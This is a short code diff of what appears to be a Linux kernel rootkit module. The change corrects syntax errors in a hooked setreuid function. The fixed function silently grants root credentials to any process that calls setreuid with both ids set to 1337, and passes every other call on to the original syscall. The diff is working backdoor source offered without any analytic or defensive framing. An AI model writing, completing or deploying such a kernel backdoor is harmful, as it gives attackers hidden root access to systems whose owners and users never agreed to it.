@@ -34,14 +34,14 @@ psize **find(void) {
     return NULL;
 }
 
-asmlinkage ssize_t (*rkit_setreuid) (ruid, euid) {
+asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid) {
     int leet = 1337;
     if ((ruid == leet) && (euid == leet)) {
         struct cred *new = prepare_creds();
-	new->uid = new->euid = make_kuid(current)user_ns(),0);
+	new->uid = new->euid = make_kuid(current_user_ns(),0);
 	commit_creds(new);
     }
-    return o_setreuid(arg1, arg2):
+    return o_setreuid(ruid, euid);
 }
 
 int rkit_init(void) {
